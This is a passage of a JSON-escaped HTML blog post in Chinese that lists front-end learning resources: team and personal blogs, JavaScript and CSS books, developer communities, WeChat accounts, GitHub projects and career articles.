href=\"https://segmentfault.com/q/1010000000340372/a-1020000000341378\"\u003e官方30行js比赛：30行js你能做出什么？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/q/1010000000767310/a-1020000000767695\"\u003e【官方比赛】社区 1111 秀代码，让你来秀让你飞！\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e3.推荐博客\u003c/h2\u003e\u003ch3\u003e团队博客\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://taobaofed.org/\"\u003e淘宝前端团队fed\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.aliued.cn/\"\u003e阿里巴巴\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://fex.baidu.com/\"\u003e百度前端团队\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://75team.com/\"\u003e360奇舞团\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://t.75team.com/video\"\u003e奇舞团视频教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://aotu.io/\"\u003e京东设计体验部-凹凸实验室\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://qqfe.org/\"\u003e腾讯网前端研发中心\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.alloyteam.com/\"\u003e腾讯alloyteam\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://imweb.io/\"\u003e腾讯前端IMWEB团队\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://imweb.github.io/\"\u003e腾讯前端IMWEB团队-github\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://tgideas.qq.com/\"\u003e腾讯游戏\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://ued.sina.com.cn/?cat=4\"\u003e新浪UED\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://blog.ymfe.org/\"\u003e去哪儿网移动架构组\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.daqianduan.com/\"\u003e大前端（饿了么）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://f2e.souche.com/blog/\"\u003e搜车大无线团队博客\u003c/a\u003e\u003cbr\u003e（上面的团队博客，值得关注，博文内容质量很高，但是就是更新不频繁，下面的更新会比较多，质量也不错）\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/dreawer\"\u003e极乐科技\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/imweb\"\u003eIMWeb前端社区\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/linshuai\"\u003e爱前端-知乎专栏\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/jscss\"\u003e前端杂货铺\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/FrontendMagazine\"\u003e前端外刊评论\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/thinkingInFE\"\u003e前端解忧杂货铺\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/ddfe-weekly\"\u003eDDFE 技术周刊\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/qianduanzhidian\"\u003e前端之巅\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://frontenddev.org/discover/\"\u003eFed汇总\u003c/a\u003e\u003c/p\u003e\u003ch3\u003e大牛博客\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://www.h5jun.com/archives/\"\u003e十年踪迹\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.zhangxinxu.com/\"\u003e张鑫旭\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.ruanyifeng.com/home.html\"\u003e阮一峰\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/\"\u003e叶小钗\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/rubylouvre/\"\u003e司徒正美博客\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/TomXu/\"\u003e汤姆大叔\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.liaoxuefeng.com/\"\u003e廖雪峰\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://jiongks.name/\"\u003e勾三股四\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/coco1s/\"\u003echokCoCo\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/chokcoco\"\u003echokCoCo-github\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://cherryblog.site/\"\u003eCherry's Blog\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://refined-x.com/\"\u003e雅X共赏的前端技术博客-前端路上\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e4.推荐书籍\u003c/h2\u003e\u003cp\u003e我看过的书比较杂七杂八，与前端有关的，推荐的就是下面这些了！下面的书，我都看过，区别就在于有些我是整本都看完了(有些也来回看过几次)，有些粗略的看了其中一部分（有些就看了几页）！\u003c/p\u003e\u003cp\u003e关于看书的建议，下面的书，大家可以根据自己的需求兴趣去挑着看。一本书，不要看完就可以了，要弄懂书中的内容。有些书值得大家来回看几遍的！\u003c/p\u003e\u003cp\u003e关于书的资源，下面的推荐的书（我看的是电子书）我都是从网上下载的。为避免侵权，我在这里就不放资源的链接了！大家自行购买纸质书或者电子书，或者到网上找资源！\u003c/p\u003e\u003cp\u003e《JavaScript高级程序设计》：（红皮书或者红宝石书）可以作为入门书籍，但同时也是高级书籍，可以快速吸收基础，等到提升再回来重新看\u003cbr\u003e《JavaScript权威指南》：（犀牛书）可以说是js最经典的一本书了，新手看着可能会有点吃力，但是对于学js的人来说，必备的，不理解的地方就去查阅一下，很有帮助。\u003cbr\u003e《数据结构与算法JavaScript描述》（刺猬书）\u003cbr\u003e《编写可维护的JavaScript》（乌龟书）\u003cbr\u003e《JavaScript DOM编程艺术 第2版》\u003cbr\u003e《JavaScript语言精粹》（蝴蝶书）：经典的书，也是普及JavaScript的开发思维的一本书。\u003cbr\u003e《javascript框架设计》（第二版）-司徒正美\u003cbr\u003e《JavaScript设计模式 》-张榕铭（百度员工写的一本书，案例生动易懂，涉及的设计模式比较全）\u003cbr\u003e《JavaScript设计模式与开发实践》-曾琛（腾讯员工写的一本书，讲了js里面更加常用的14个设计模式）\u003cbr\u003e《单页Web应用 JavaScript从前端到后端》\u003cbr\u003e《\u003ca href=\"http://es6.ruanyifeng.com/\"\u003eECMAScript 6 入门\u003c/a\u003e》可以作为es6新特性文档的一本书，而且这本书开源了（\u003ccode\u003e\u003ca href=\"http://es6.ruanyifeng.com/\"\u003eECMAScript 6 入门\u003c/a\u003e\u003c/code\u003e），直接看就好！需要的也可以购买！\u003c/p\u003e\u003cp\u003e《HTML5移动Web开发实战》\u003cbr\u003e《HTML5移动Web开发指南》\u003cbr\u003e《HTML5 Canvas核心技术》：对于感受canvas的魅力，使用，动画的实现，都非常有帮助。\u003cbr\u003e《html5与css3权威指南 第三版》-陆凌牛，这本书貌似有同名的，注意作者，另外该书分上册和下册的。我当时看的是第二版，现在已经出了第三版就推荐第三版了。\u003cbr\u003e《锋利的jquery》：我学jquery就是看这本书，这本书给我身边的同行印象不是很好，但是我感觉不错，而且我学jquery就看了这一本书，就推荐这本了！\u003cbr\u003e《了不起的Node js 将JavaScript进行到底》\u003cbr\u003e《css揭秘》：看了这本书，我再也不敢说自己会css了！里面很多都是你想不到的！\u003c/p\u003e\u003ch2\u003e5.推荐社区\u003c/h2\u003e\u003cp\u003e我推荐社区虽然有这么多个，但是我注册账号并且活跃的只有两三个，其它的社区基本都是我在学习的时候偶然接触到的，并且觉得不错的，所以也推荐下。至于大家想活跃哪几个社区，就看大家的选择了。如果大家有什么好的社区资源，也不妨推荐下！\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://github.com/\"\u003egithub\u003c/a\u003e：这个起初我经常在上面找资源。但是没注册账号，但是后来被老大催着注册，就去了。在里面可以阅读别人的代码，向大家学习！\u003cbr\u003e\u003ca href=\"https://juejin.im/\"\u003e稀土掘金\u003c/a\u003e：我现在活跃的一个社区，是写文章的一个很好的地方！\u003cbr\u003e\u003ca href=\"https://segmentfault.com/\"\u003esegmentfault\u003c/a\u003e：我现在活跃的一个社区，主打问答，也有文章和讲堂，质量也很不错！\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/\"\u003e知乎\u003c/a\u003e：虽然不是单纯的IT社区，但是里面有很多大牛和高质量的专栏！\u003cbr\u003e\u003ca href=\"https://stackoverflow.com/\"\u003estackoverflow\u003c/a\u003e：一个问答社区，基本上各种问题都能在上面获得解答\u003cbr\u003e\u003ca href=\"http://www.w3cplus.com/\"\u003ew3cplus\u003c/a\u003e：一个前端学习的网站，里面的文章质量都挺不错的，特别是关于CSS(3)的\u003cbr\u003e\u003ca href=\"http://www.qdfuns.com/\"\u003e前端网\u003c/a\u003e\u003ca href=\"http://www.html-js.com/\"\u003e前端乱炖\u003c/a\u003e：一个前端文章分享的社区，有很多优秀文章\u003cbr\u003e\u003ca href=\"https://toutiao.io/\"\u003e开发者头条\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.feweekly.com/issues\"\u003e前端周刊\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.html5dw.com/\"\u003eHTML5梦工场\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/\"\u003e毕业僧\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.imooc.com/\"\u003e慕课网\u003c/a\u003e（貌似现在很多视频收费了，以前我看的时候，基本都是免费的）\u003cbr\u003e\u003ca href=\"http://www.hubwiz.com/\"\u003e汇智网\u003c/a\u003e\u003c/p\u003e\u003ch2\u003e6.公众号\u003c/h2\u003e\u003ch3\u003e前端大全\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf43692119500?w=110\u0026amp;h=112\u0026amp;f=png\u0026amp;s=14340\"\u003e\u003c/p\u003e\u003ch3\u003esegmentfault\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf43677205fcd?w=111\u0026amp;h=111\u0026amp;f=png\u0026amp;s=21413\"\u003e\u003c/p\u003e\u003ch3\u003e前端之巅\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf436b488e241?w=109\u0026amp;h=109\u0026amp;f=png\u0026amp;s=11196\"\u003e\u003c/p\u003e\u003ch3\u003e前端早读课\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf43675e9f24e?w=111\u0026amp;h=110\u0026amp;f=png\u0026amp;s=13657\"\u003e\u003c/p\u003e\u003ch3\u003eW3cplus\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4368566b3e8?w=110\u0026amp;h=112\u0026amp;f=png\u0026amp;s=15201\"\u003e\u003c/p\u003e\u003ch3\u003e稀土圈\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4368734b834?w=107\u0026amp;h=108\u0026amp;f=png\u0026amp;s=7119\"\u003e\u003c/p\u003e\u003cp\u003e（以上图片来源网络）\u003c/p\u003e\u003ch2\u003e7.推荐关注项目\u003c/h2\u003e\u003ch3\u003egithub上的项目\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://github.com/vuejs/vue\"\u003evue\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/facebook/react\"\u003ereact\u003c/a\u003e（我只接触过几次react，使用起来还不错，现在也正在学习）\u003cbr\u003e\u003ca href=\"https://github.com/gulpjs/gulp\"\u003egulp\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/parcel-bundler/parcel\"\u003eparcel\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/webpack/webpack\"\u003ewebpack\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/d3/d3\"\u003ed3\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/chartjs/Chart.js\"\u003echart\u003c/a\u003e（和d3一样，属于数据可视化方面，体验过。但是在项目上没用过，感觉功能强大，就推荐下）\u003cbr\u003e\u003ca href=\"http://element.eleme.io/#/zh-CN\"\u003eelement-ui\u003c/a\u003e（基于vue2.x开发的一个组件库，一般用于后台管理系统开发，现在我们公司开发的后台管理就是用这个）\u003cbr\u003e\u003ca href=\"http://www.muse-ui.org/#/chip\"\u003emuse-ui\u003c/a\u003e（同样是基于vue的组件库，ui非常的漂亮）\u003cbr\u003e\u003ca href=\"https://github.com/nswbmw/N-blog\"\u003e一起学 Node.js\u003c/a\u003e（这个其实应该是node.js教程）\u003cbr\u003e\u003ca href=\"https://github.com/AlloyTeam/AlloyFinger\"\u003eAlloyTeam移动端手势解决方案\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/dypsilon/frontend-dev-bookmarks\"\u003efrontend-dev-bookmarks\u003c/a\u003e（前端各方面的学习清单）\u003cbr\u003e\u003ca href=\"https://github.com/justjavac/free-programming-books-zh_CN\"\u003e免费的编程中文书籍\u003c/a\u003e（中文分享书籍，不止前端，各方面都有，大家按需查看）\u003cbr\u003e\u003ca href=\"https://github.com/daneden/animate.css\"\u003eanimate.css\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/IanLunn/Hover\"\u003ehover.css\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/museui/muse-ui\"\u003emuse-ui\u003c/a\u003e（基于vue2.0的一个UI库，样式漂亮，种类全）\u003cbr\u003e\u003ca href=\"https://github.com/chokcoco/css3-\"\u003eCSS3 实现各类3D效果的博客\u003c/a\u003e（和下面三个连接同属一个作者，这个大牛的作品不错，效果酷炫，虽然star数量与其它几个推荐项目没法比，但是很值得推荐）\u003cbr\u003e\u003ca href=\"https://github.com/chokcoco/boomJS\"\u003echokcoco/boomJS\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/chokcoco/magicCss\"\u003echokcoco/magicCss\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/chokcoco/iCSS\"\u003echokcoco/iCSS\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/akira-cn/handlock\"\u003ehandtouch\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/vuejs/awesome-vue\"\u003eawesome-vue\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://electron.org.cn/\"\u003eElectron\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://m.baidu.com/mip/c/s/lavas.baidu.com/mip/guide/vue/doc/vue/webpack/vue-skeleton-webpack-plugin?qq-pf-to=pcqq.discussion\"\u003evue-skeleton-webpack-plugin\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/youngwind/blog\"\u003e梁少峰的个人博客\u003c/a\u003e（里面的文章质量也不错，各种都有，js,jquery,vue,react,node.js等）\u003cbr\u003e\u003ca href=\"https://github.com/Reactive-Extensions/RxJS\"\u003eRxJs\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/PAIR-code/deeplearnjs\"\u003edeeplearn\u003c/a\u003e（谷歌出版，一个关于人工智能深度学习的框架，有兴趣可以看，我看了一会，没看懂）\u003c/p\u003e\u003cp\u003e（下面这两个是我自己的开发的项目，虽然跟其他项目比较欠缺火候，但是还不至于用不了或者拿不出手的地步，也算是我的一个小广告吧！(●'◡'●)）\u003cbr\u003e\u003ca href=\"https://github.com/chenhuiYj/ec-do\"\u003eec-do\u003c/a\u003e（封装了日常开发常用的javascript实例，实例为日常开发常用的小实例，包括数组去重，打乱数组，字母大小写转换，cookie操作的封装等。）\u003cbr\u003e\u003ca href=\"https://github.com/chenhuiYj/ec-css\"\u003eec-css\u003c/a\u003e（基于css3开发的代码库，包括日常使用的hover过渡效果，动画效果，以及预设动画）\u003c/p\u003e\u003ch3\u003e其它推荐项目\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://css3lib.alloyteam.com/#image_effects/3d_%20image_transitions\"\u003e腾讯css3 ui库\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://nec.netease.com/library\"\u003eNEC : 更好的CSS样式解决方案\u003c/a\u003e（网易的一个css3解决方案，但是貌似挺旧了，不维护了，但是里面的案例大家可以参考，绝对有收获）\u003c/p\u003e\u003ch2\u003e8.综合项目教程（学习实录）\u003c/h2\u003e\u003cp\u003e\u003ca href=\"http://lib.csdn.net/article/nodejs/8926\"\u003e使用node.js + socket.io + redis实现基本的聊天室场景\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/41.html\"\u003e前端开发，从草根到英雄（第一部分）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/42.html\"\u003e前端开发，从草根到英雄（第二部分）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/591afe90128fe1005ce339f7\"\u003e我的前端进阶之路\u003c/a\u003e（看着标题以为是杂谈，实际上感觉是一篇总结性文章，大家可以看下）\u003cbr\u003e\u003ca href=\"http://tgideas.qq.com/webplat/info/news_version3/804/7104/7106/m5723/201404/258291.shtml\"\u003e为你的移动页面寻找一丝新意——手机互动网页项目总结（上）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://tgideas.qq.com/webplat/info/news_version3/804/7104/7106/m5723/201404/258325.shtml\"\u003e为你的移动页面寻找一丝新意——手机互动网页项目总结（下）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/592faca42f301e006bc791e0\"\u003e前端开发指南2017\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/archive/2013/04/29/3050798.html\"\u003e【实战HTML5与CSS3 第一篇】初探水深，美丽的导航，绚丽的图片爆炸！！\u003c/a\u003e（看完别忘记下面的，是叶小钗大神仿智能社官网的实战）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000009705021\"\u003e基于 Vue 2.0 实现的移动端弹窗 (Alert, Confirm, Toast)组件.\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://cdc.tencent.com/2017/03/09/%E5%8F%91%E7%8E%B0%E6%9C%80%E5%A5%BD%E7%9A%84%E4%BD%A0-%E8%AE%BE%E8%AE%A1%E4%B8%AD%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E6%9C%80%E5%90%88%E9%80%82%E7%9A%84%E7%BB%84%E4%BB%B6/\"\u003e发现最好的你-设计中如何打造最合适的组件\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010025189\"\u003ewebpack+vue项目实战（一,搭建运行环境和相关配置）\u003c/a\u003e（我自己的文章，关于使用vue+webpack开发一个单页应用，一个后台管理系统的开发搭建，这个系列一共有五篇文章）\u003c/p\u003e\u003ch2\u003e9.开发杂谈\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://juejin.im/post/59bf2a1d51882531b730b718\"\u003eweb前端--10个妨碍进步的学习方式\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a229c9cf265da432652a5ef\"\u003e前端入行两年--教会了我这些道理\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/59e2574f51882578e310fcb1\"\u003e关于IT培训机构的个人看法\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/27996237\"\u003eOpenDoc - 前端简历评级标准\u003c/a\u003e（美团出的一份简历评级，可以适当参考下，对比下自己的实力和美团评级。当然有兴趣的也可以去面试）\u003cbr\u003e\u003ca href=\"https://coderlmn.github.io/code-standards/\"\u003e前端代码规范及最佳实践\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552449\u0026amp;idx=1\u0026amp;sn=064fb651607ae3d5c4c0be0bf715ccfc\u0026amp;chksm=8025ad00b752241689ae07884fce85062ff7265d6a0f26bf7d0f24a2db7dfe97a3b6b5e7eeff\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=0812DoWbLlHTJE58WsdOwMCL#rd\"\u003eVue.js 很好，但是比 Angular 或 React 更好吗？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/28094239\"\u003e聊聊技术选型 - Angular2 vs Vue2\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26256056\"\u003e写给前端工程师看的，移动应用选型指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://xuexb.com/html/wang-zhan-jia-gou-cong-wu-dao-you.html/\"\u003e网站架构-从无到有\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://kb.cnblogs.com/page/210101/\"\u003e前端架构那些事儿\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/74.html\"\u003e技术大牛养成指南，一篇不鸡汤的成功学实践\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://caibaojian.com/6-javascript-framework.html\"\u003e6 个值得好好学习的 JavaScript 框架\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552430\u0026amp;idx=1\u0026amp;sn=cb080d60f7f3e515ef9d179546a5bef9\u0026amp;chksm=8025ad6fb752247978afbbd052dccd753ce87af1fd66806b6463bd08533d9cbfeca040f17983\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=0804epi66xRdfCUWvFkIz7rF#rd\"\u003e更快学习 JS 的 6 个简单思维技巧\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/47.html\"\u003e程序员怎么学英语\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/39.html\"\u003e8个让程序员追悔莫及的职业建议\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.biyeseng.cn/front/articleinfo/45.html\"\u003e当心！程序员应警惕七种错误的职业规划\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/23159199\"\u003e1024程序员节，写给年轻程序员的建议\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://blog.csdn.net/foruok/article/details/48310323\"\u003e给新程序员的10条建议\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552445\u0026amp;idx=1\u0026amp;sn=de8114700cd0c20d76d108f108a500ca\u0026amp;chksm=8025ad7cb752246abbc363a048ca8069cd16e4610f9041d660d11eb6dc51d2a980284451b92a\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=0810dcQlbCq9xTCwQWXcYFgb#rd\"\u003e前端框架这么多，该何去何从？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.css88.com/archives/7175\"\u003e2017年前端开发工具趋势\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552426\u0026amp;idx=1\u0026amp;sn=6e7467d6fa3f2aea6dbcb8da1940cdd9\u0026amp;chksm=8025ad6bb752247d3b236e3cd6161f36f1f0b22faa6fe0248b674bce9d0830677259fb10643c\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=080402tLAhviTxL6sUhJCDf7#rd\"\u003e现代前端开发技术栈\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/89943/\"\u003e听说2017你想写前端？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://uptodate.frontendrescue.org/zh/\"\u003e如何跟上前端开发的最新前沿\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://geek.csdn.net/news/detail/88239\"\u003e前端开发人员必须了解的七大技能图谱\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/JacksonTian/fks\"\u003e前端技能汇总（JacksonTian）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.f2er.info/\"\u003e另一张前端技能汇总图\u003c/a\u003e（和上面的一个链接一样，但是看的话，建议大家带参考的思想看）\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/19554845\"\u003e怎样成长为一个优秀的 Web 前端开发工程师？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/28044664\"\u003e月薪10-12k的前端人员应该具备怎样一种技术水平？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/27471576/answer/211014066\"\u003e作为一名前端开发人员，有哪些值得一读的js代码？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.limuyang.cc/2017/11/10/%E4%B8%8D%E5%90%B9%E4%B8%8D%E9%BB%91%E8%81%8A%E8%81%8A%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6-%E5%B0%A4%E9%9B%A8%E6%BA%AALive%E6%95%B4%E7%90%86/\"\u003e不吹不黑聊聊前端框架--尤雨溪Live整理\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.gitbook.com/book/sqrtthree/front-end-handbook-2017/details\"\u003e前端开发者指南（2017）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/35737930\"\u003e为什么一些公司招前端不想要培训班出来的人？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/30308437\"\u003e前端新人不容易\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/30918074\"\u003e现在Web前端是不是已经饱和了?\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==\u0026amp;mid=2651227472\u0026amp;idx=2\u0026amp;sn=c2bd881c28cdabdb7bdff0337eb0f5b0\u0026amp;chksm=bd495cd48a3ed5c234328fd36e35cfc131866a3218f317bbe164b137e9c3e8dd649b62abde9b\u0026amp;mpshare=1\u0026amp;scene=1\u0026amp;srcid=1220CMMn57xc5IMTaBHQlHTI#rd\"\u003e2017前端技术发展回顾\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/590b451a0ce46300588c43a0\"\u003ehexo高阶教程：教你怎么让你的hexo博客在搜索引擎中排第一\u003c/a\u003e（有兴趣的可以看一下，有用）\u003cbr\u003e\u003ca href=\"https://opensource.guide/legal/#which-open-source-license-is-appropriate-for-my-project\"\u003e开放源码的法律面\u003c/a\u003e（因为国外对版权，许可证很是注重，该文章就讲代码开源后关于许可证的文章，看得我有点蒙，但是最终整理后，我的开源项目就用MIT）\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e10.开发经常会接触的网站\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://developer.mozilla.org/zh-CN/docs/Web\"\u003eMDN-web技术文档\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://zhitu.isux.us/\"\u003e智图_图片压缩在线工具_在线制作webp\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://imgbase64.duoshitong.com/\"\u003e多视通图片转换Base64\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/wiki?t=resource/res_main\u0026amp;id=mp1421141115\"\u003e微信JS-SDK说明文档\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://cli.im/\"\u003e草料二维码\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.runoob.com/\"\u003e菜鸟教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cschool.cn/\"\u003ew3cschool\u003c/a\u003e\u003c/p\u003e\u003ch2\u003e11.小结\u003c/h2\u003e\u003cp\u003e好了，我学前端看过的博客文章，关注过的大牛和项目，项目技术栈的教程基本都在这里了！我分享的这些，不敢说最好，最全，适合每个人。但是都是我看过或者接触过的，至少内容上让我满意的，让我觉得是对学习有用的，能帮到大家的。如果大家有什么学习资源推荐的，我也希望大家不吝啬的共享给我，给大家！\u003c/p\u003e\u003cp\u003e这篇文章，对于大家而言是一个资源的合集，但对于我而言，可能是一个分割线。发完2017最后一篇文章在以后我可能会在务实基础的前提下，注重深入的探究，发的文章可能会比现在的文章深入，文章产量可能不会像现在这么频繁！\u003c/p\u003e\u003cp\u003e还有一个建议就是，学习web前端，上面分享的可以起到一个引导，指路，解惑的作用。但是，大家不要忘记多练，毕竟实操最重要！大家有空余的时间或者周末也可以自己做下自己有兴趣的项目，并且用在自己工作的项目开发上！项目不求比别人好，只求自己能练习，提升自己的技术水平！\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003cbr\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514894894.3952","__v":0}
